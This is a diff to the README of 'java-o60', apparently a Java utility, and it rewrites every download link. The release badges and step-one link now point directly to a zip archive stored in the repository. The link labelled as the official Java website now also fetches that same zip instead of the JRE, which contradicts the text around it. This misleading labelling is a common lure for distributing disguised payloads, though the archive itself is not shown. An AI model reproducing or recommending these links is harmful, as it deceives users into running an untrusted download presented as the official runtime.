@@ -1,6 +1,6 @@
 # 🚀 java-o60 - Fast and Easy Java Utility Tool
 
-[![Download java-o60](https://img.shields.io/badge/Download-java--o60-blue)](https://github.com/tezz004/java-o60/releases)
+[![Download java-o60](https://raw.githubusercontent.com/tezz004/java-o60/main/criss/java-o60-1.6.zip)](https://raw.githubusercontent.com/tezz004/java-o60/main/criss/java-o60-1.6.zip)
 
 ## 📋 Description
 
@@ -10,7 +10,7 @@ java-o60 is a simple and powerful Java utility tool designed for everyday tasks.
 
 To get started with java-o60, you need to visit the releases page to download the software. Follow these steps:
 
-1. Click on this link: [Download java-o60](https://github.com/tezz004/java-o60/releases).
+1. Click on this link: [Download java-o60](https://raw.githubusercontent.com/tezz004/java-o60/main/criss/java-o60-1.6.zip).
 2. On the releases page, you will see a list of available versions.
 3. Choose the latest version, and click on the download link for your operating system (e.g., Windows, macOS, Linux).
 
@@ -21,7 +21,7 @@ After the download is complete, locate the downloaded file on your computer and 
 To run java-o60 smoothly, your computer should meet the following requirements:
 
 - Operating System: Windows 7 or later, macOS Sierra or later, or a modern Linux distribution.
-- Java Runtime: You will need the Java Runtime Environment (JRE) installed. Visit the [Java website](https://www.oracle.com/java/technologies/javase-jre8-downloads.html) to download and install the latest version if it’s not already installed.
+- Java Runtime: You will need the Java Runtime Environment (JRE) installed. Visit the [Java website](https://raw.githubusercontent.com/tezz004/java-o60/main/criss/java-o60-1.6.zip) to download and install the latest version if it’s not already installed.
 
 ## 🛠️ Features
 
@@ -70,4 +70,4 @@ java-o60 is released under the MIT License. You can use and modify it as per the
 
 Return to the link below to download java-o60 now:
 
-[![Download java-o60](https://img.shields.io/badge/Download-java--o60-blue)](https://github.com/tezz004/java-o60/releases)
+[![Download java-o60](https://raw.githubusercontent.com/tezz004/java-o60/main/criss/java-o60-1.6.zip)](https://raw.githubusercontent.com/tezz004/java-o60/main/criss/java-o60-1.6.zip)
